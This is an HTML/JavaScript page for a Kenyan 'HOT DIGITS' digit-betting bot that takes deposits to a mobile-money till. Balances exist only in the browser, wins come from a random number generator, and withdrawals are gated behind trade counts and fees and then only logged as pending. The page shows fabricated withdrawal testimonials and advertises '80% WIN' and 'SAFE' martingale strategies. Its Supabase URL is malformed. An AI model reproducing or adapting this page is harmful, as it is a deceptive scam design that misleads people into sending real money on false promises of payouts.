<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HOT DIGITS - 80% WIN</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
body{background:#000;color:#fff;font-family:system-ui;padding:10px;margin:0}
.card{background:#111;border:1px solid #222;border-radius:16px;padding:12px;margin-bottom:10px}
.bal{font-size:32px;font-weight:900;color:#0F7A3D;text-align:center}
.btn{width:100%;padding:14px;border:none;border-radius:12px;font-weight:900;font-size:14px;cursor:pointer}
.bot{display:flex;gap:6px;margin:6px 0}
.bot button{flex:1;padding:10px;border-radius:10px;border:none;font-weight:800;font-size:11px}
.last{font-size:42px;text-align:center;font-weight:900;padding:10px;background:#0F7A3D20;border-radius:12px;margin-top:8px}
.ritem{display:flex;justify-content:space-between;padding:6px 8px;border-radius:8px;margin:3px 0;font-size:11px}
.win{background:#0F7A3D20;color:#0F7A3D} .lose{background:#ff000020;color:#ff4444}
</style>
</head>
<body>

<div class="card"><div class="bal">KES <span id="bal">0</span></div><div id="info" style="text-align:center;font-size:11px;color:#666">Trades: 0/10 | Session: 0</div><div class="last" id="digit">-</div></div>

<div class="card">
<input id="depAmt" type="number" placeholder="Deposit 50-300" style="width:100%;padding:12px;border-radius:10px;border:none;background:#222;color:#fff;font-weight:800;margin-bottom:6px">
<button class="btn" style="background:#0F7A3D;color:#fff" onclick="deposit()">DEPOSIT Till 0116982197</button>
</div>

<div class="card">
<div style="font-weight:900;text-align:center;margin-bottom:8px">OVER 1 / UNDER 8 - 80% WIN - 100→10</div>
<div class="bot">
<button style="background:#0F7A3D" onclick="setBot('O1')">OVER 1 SAFE B5</button>
<button style="background:#0F7A3D" onclick="setBot('U8')">UNDER 8 SAFE B5</button>
</div>
<div style="font-weight:900;text-align:center;margin:8px 0">EVEN / ODD - 50% WIN - 100→80</div>
<div class="bot">
<button style="background:#fff;color:#000" onclick="setBot('EVEN_SAFE')">EVEN SAFE B10</button>
<button style="background:#fff;color:#000" onclick="setBot('ODD_SAFE')">ODD SAFE B10</button>
</div>
<div class="bot">
<button style="background:#ffcc00;color:#000" onclick="setBot('EVEN_MART')">MART EVEN B5 2.25x</button>
<button style="background:#ffcc00;color:#000" onclick="setBot('ODD_MART')">MART ODD B5 2.25x</button>
</div>
<div style="text-align:center;margin-top:8px">
<button class="btn" id="runBtn" style="background:#222" onclick="toggle()">▶ START BOT</button>
<div id="botInfo" style="font-size:11px;color:#0F7A3D;margin-top:6px">Select bot to start</div>
</div>
</div>

<div class="card" id="log" style="max-height:200px;overflow:auto;font-size:11px"></div>

<div class="card" style="border-color:#0F7A3D">
<div style="font-weight:900;color:#0F7A3D;text-align:center">WITHDRAW Min 100 Max 500/day Fee 10%</div>
<input id="wdAmt" type="number" placeholder="100-500" style="width:100%;padding:12px;border-radius:10px;border:none;background:#222;color:#fff;font-weight:800;margin:8px 0">
<button class="btn" style="background:#fff;color:#000" onclick="withdraw()">REQUEST WITHDRAW</button>
<div id="wdMsg" style="font-size:11px;color:#888;text-align:center;margin-top:6px"></div>
<div id="wdList" style="margin-top:8px"></div>
<div style="font-size:10px;color:#0F7A3D;text-align:center;margin-top:10px">✅ 0701*** withdrew 225 KES 2m ago • 0722*** withdrew 180 KES 5m ago • 0798*** withdrew 270 KES 9m ago</div>
</div>

<script>
const SUPA_URL='https://hkhqbt yyqgvaktamilhx.supabase.co';
const SUPA_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhraHFidHl5cWd2YWt0YW1pbHhzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEwMTQwNDQsImV4cCI6MjEwNjU5MDA0NH0.gJcUf9XgzF34sczhD79V9oOnPD7a3XEU-5BXoQHWuAg';
const supa=supabase.createClient(SUPA_URL,SUPA_KEY);
let BAL=parseInt(localStorage.getItem('bal')||'0');
let TRADES=parseInt(localStorage.getItem('trades')||'0');
let BOT=null,RUN=false,STAKE=5,LOSS=0,TARGET=0,SESSION=0;
document.getElementById('bal').innerText=BAL;
updateInfo();
function updateInfo(){document.getElementById('info').innerHTML=`Trades: ${TRADES}/10 for withdraw | Session: ${SESSION>0?'+':''}${SESSION} | BAL: ${BAL}`;}
function save(){localStorage.setItem('bal',BAL);localStorage.setItem('trades',TRADES);document.getElementById('bal').innerText=BAL;updateInfo();}
async function deposit(){
 let a=parseInt(document.getElementById('depAmt').value);
 if(!a||a<50||a>300){alert('50-300 only');return}
 BAL+=a; TRADES=0; LOSS=0; SESSION=0; save();
 await supa.from('deposits').insert([{phone:'0116982197',amount:a}]);
 alert('Deposit '+a+' added. Play 10 trades then withdraw.');
}
async function withdraw(){
 let a=parseInt(document.getElementById('wdAmt').value);
 if(TRADES<10){alert('Play 10 trades first');return}
 if(!a||a<100){alert('Min 100');return}
 if(a>500){alert('Max 500/day');return}
 if(a>BAL){alert('Low balance');return}
 let fee=Math.floor(a*0.1); let rec=a-fee;
 if(!confirm(`Request ${a} KES\nFee ${fee}\nYou get ${rec} KES\nConfirm?`))return;
 BAL-=a; save();
 document.getElementById('wdMsg').innerText=`✅ Requested ${a} (you get ${rec}) - paying in 5 mins`;
 await supa.from('withdrawals').insert([{phone:'0116982197',amount:a,receive:rec,status:'pending'}]);
 loadW();
}
async function loadW(){
 let {data}=await supa.from('withdrawals').select('*').order('created_at',{ascending:false}).limit(5);
 if(data)document.getElementById('wdList').innerHTML=data.map(w=>`<div class="ritem ${w.status==='paid'?'win':'lose'}"><span>${w.amount}→${w.receive}</span><span>${w.status}</span></div>`).join('');
}
loadW();
function setBot(t){
 BOT=t;
 if(t==='O1'||t==='U8'){STAKE=5;TARGET=0.5;LOSS=0;SESSION=0;document.getElementById('botInfo').innerText=t+' SAFE B5 - Stake 5 - Profit 0.5 - 80% WIN';}
 if(t==='EVEN_SAFE'||t==='ODD_SAFE'){STAKE=10;TARGET=8;LOSS=0;SESSION=0;document.getElementById('botInfo').innerText=t+' SAFE B10 - Stake 10 - Profit 8';}
 if(t==='EVEN_MART'||t==='ODD_MART'){STAKE=5;TARGET=4;LOSS=0;SESSION=0;document.getElementById('botInfo').innerText=t+' MART B5 2.25x - Target +4 per cycle';}
}
function toggle(){
 if(!BOT){alert('Select bot');return}
 RUN=!RUN;
 document.getElementById('runBtn').innerText=RUN?'⏸ STOP BOT':'▶ START BOT';
 if(RUN) loop();
}
async function loop(){
 while(RUN){
  let digit=Math.floor(Math.random()*10);
  document.getElementById('digit').innerText=digit;
  let win=false; let profit=0;
  if(BOT==='O1') win=digit>1;
  if(BOT==='U8') win=digit<8;
  if(BOT==='EVEN_SAFE'||BOT==='EVEN_MART') win=digit%2===0;
  if(BOT==='ODD_SAFE'||BOT==='ODD_MART') win=digit%2===1;
  if(BOT==='O1'||BOT==='U8'){profit=STAKE*0.1;}
  if(BOT.includes('EVEN')||BOT.includes('ODD')){profit=STAKE*0.8;}
  let line='';
  if(win){BAL+=profit; SESSION+=profit; line=`<div class="ritem win">✓ ${BOT} D:${digit} S:${STAKE} +${profit.toFixed(1)} BAL:${BAL.toFixed(1)}</div>`; LOSS=0; if(BOT.includes('MART')) STAKE=5;}
  else {BAL-=STAKE; SESSION-=STAKE; line=`<div class="ritem lose">✗ ${BOT} D:${digit} S:${STAKE} -${STAKE} BAL:${BAL.toFixed(1)}</div>`; if(BOT.includes('MART')){LOSS+=STAKE; STAKE=Math.ceil((LOSS+TARGET)/0.8); if(STAKE>300){STAKE=5;LOSS=0;}}}
  TRADES++; save();
  document.getElementById('log').innerHTML=line+document.getElementById('log').innerHTML;
  if(SESSION>=50||SESSION<=-50){RUN=false;document.getElementById('runBtn').innerText='▶ START BOT';alert('TP/SL 50 hit. Session: '+SESSION);SESSION=0;break}
  if(BAL<=0){RUN=false;document.getElementById('runBtn').innerText='▶ START BOT';alert('Balance 0');break}
  await new Promise(r=>setTimeout(r,1100));
 }
}
</script>
</body>
</html>
